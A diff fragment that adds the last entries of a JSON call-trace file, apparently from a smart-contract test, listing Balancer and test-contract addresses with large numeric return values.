+        "args": "Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]",
+        "original_code": null,
+        "description": null,
+        "return_value": "85248028035718445004044 [8.524e22]"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "7929437137321151670373 [7.929e21]"
+    },
+    {
+        "id": "2444",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "18"
+    }
+]
